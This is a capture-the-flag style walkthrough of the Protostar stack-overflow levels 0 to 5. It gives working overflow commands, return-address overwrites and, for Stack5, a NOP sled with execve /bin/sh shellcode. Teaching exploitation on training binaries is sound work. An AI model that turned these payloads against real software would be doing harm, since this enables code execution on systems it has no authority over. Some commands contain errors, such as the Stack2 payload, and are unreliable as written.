# Exploit-Exercises Protostar Writeup - Stack
## Before Start
Here are some readings to help you understand the stack
[How to smash stack](http://insecure.org/stf/smashstack.html)

## [Stack0](https://exploit-exercises.com/protostar/stack0/)
This is a very basic overflow. Any input having a length greater than 64 works. 


## [Stack1](https://exploit-exercises.com/protostar/stack1/)
On this level, we have to overwrite the value of 'modified' to 0x61626364, which is "abcd" in ascii characters. Protostar is little endian, so we have to reverse it when we write it into a stack.    
	```./stack1 $(python -c 'print "A"*64+"dcba"')```   


## [Stack2](https://exploit-exercises.com/protostar/stack2/)
This one is almost the same as the previous one. The only difference is the buffer comes from a environment variable called "GREENIE".   
We should set the environment variable and then run the program. The commands are:    
	```
	export GREENIE=$(python -c 'print "A"*64+"0x0a0x0d0x0a0xd"')
	./stack2
	```


## [Stack3](https://exploit-exercises.com/protostar/stack3/)
This time, the varaible can be overwritten is a pointer to a function. So what we need to do is find out the address of win() and use this value to overwrite *fp (in little endian).    
Use command ```objdump -D stack3|grep win```. Now we find the address of win() is 08048424.   
Looking at the source code, we can see the buffer comes from standard input this time. So the command should be:     
	```python -c 'print "A"*64+"\x24\x84\x04\x08"' | ./stack3```    


## [Stack4](https://exploit-exercises.com/protostar/stack4/)
This challenge is about EIP overwrite. There's no variable lying on the buffer again. When we overflow the buffer, we will first overwirte the saved EBP(4 Byte), and saved EIP(4 Byte).    
So in this case, the length of the padding will be 64+4=68. And we also need to get the address of win() just as we did in last challenge. It's 080483f4. Now run it! Ooooooops! It failed!! It apperars that there's something more than saved EBP lying between the buffer and the saved EIP. We can use gdb to find it out. (You can also use a pattern long enough to overwrite the EIP and then locate it, as the program will show the error information.)     
We start gdb and set a breakpoint at main(). Then give serveral "A" as the input. We know it will not work, but it can help us to locate the start address of the buffer. Then we use ```info frame``` to check the address of saved eip. We can see it's at 0xbffff7dc.     
![stack4_1](./images/stack4_1.png)     
Now let's look at the data in this frame. It's easy to find that the buffer start at address 0xbffff790. So we can get the length of our padding by calculating 0xbffff7dc-0xbffff790=76. I also look at why we get 8 bytes more than expected. It saves the address of __libc_csu_init and another 4 null bytes. (I didn't figure out the purpose of it)    
![stack4_2](./images/stack4_2.png)
The command should be:    
	```python -c 'print "A"*76+"\xf4\x83\x04\x08"' | ./stack4```    


## [Stack5](https://exploit-exercises.com/protostar/stack5/)
In this challenge, we need to exploit the buffer overflow to execute shellcode. I have no idea about what shellcode is expected in this challenge. So I decide to start first. 
The buffer start at address 0xbffff7d0. Saved EIP is at 0xbffff81c. The length is still 76. What we gonna do is to overwrite the saved EIP with the address after, and fill the buffer with our paddings. 
So the structure will look like padding + address + payload(shellcode). The payload can be found on [shell-storm.org](shell-storm.org). I use the 28 Bytes execve(/bin/sh). And then.. I got an "Illegal instrction" error. The reason can be that when the program acturally run, the address may be different with that in gdb. So instead of find out the specific address, we can use a bunch of NOP instruction (\x90) before our shellcode. We just need to make our eip point into the middle of the NOPs, then our shellcode will work.     
The structure of the input looks like:     
```"A"*76+"\x60\xf8\xff\xbf"+"\x90"*300+[shellcode]```    
And when I run the program, there's no more errors, but also no shell executed. This is not what we want. So I turned to gdb again. Then I found something really weird: when I use gdb to dubug it, the shell is actually executed.    
I stuck here for a really long time. I then searched online and found two solutions.    
[1](http://liveoverflow.com/binary_hacking/protostar/stack5.html) | [2](https://www.mattandreko.com/2011/12/17/exploit-exercises-protostar-stack-5/)    
I prefer the second one. So I changed my shellcode, and it works perfectly.     
The whole command will be:    
```python -c 'print "A"*76+"\x60\xf8\xff\xbf"+"\x90"*300+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./stack5```    
![stack5_1](./images/stack5_1.png)


## [Stack6](https://exploit-exercises.com/protostar/stack6/)
## [Stack7](https://exploit-exercises.com/protostar/stack7/)
